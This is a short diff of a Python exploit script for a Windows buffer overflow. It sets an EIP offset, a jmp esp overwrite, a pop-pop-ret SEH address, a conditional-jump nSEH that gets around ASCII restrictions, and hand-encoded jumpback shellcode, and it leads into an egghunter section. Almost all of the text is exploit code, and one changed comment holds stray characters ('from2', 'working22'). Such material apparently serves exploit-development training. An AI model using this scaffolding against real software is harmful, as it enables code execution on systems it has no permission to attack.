@@ -21,6 +21,7 @@ offset = 2047  # offset of EIP
 junk = b"A" * offset
 eip = b"BBBB"  # To test if we successfully overwrite the EIP
 new_eip = p32(0x00000000)  # address converted to little endian
+new_eip = struct.pack("<I", jmpesp) # import struct first.
 
 # === SEH ===
 nseh = b"\x74\x06\x75\x04"  # Jump Net techique(JZ 0x6, JNZ 0x4). This will bypass ascii restrictions as well
@@ -32,7 +33,7 @@ seh = p32(0x625010b4)  # pop pop ret - find with !mona seh
 # Manual jump based on stack difference
 # b'TXf\x05e\x05\xff\xe0'
 jumpback = asm("push esp; pop eax; add ax, 0x565; jmp eax;")
-# manual hand encoding from nasmshell - also working
+# manual hand encoding from2 nasmshell - also working22
 jumpback = b"\x54\x58\x66\x05\x65\x05\xff\xe0"
 
 # === egghunter ===
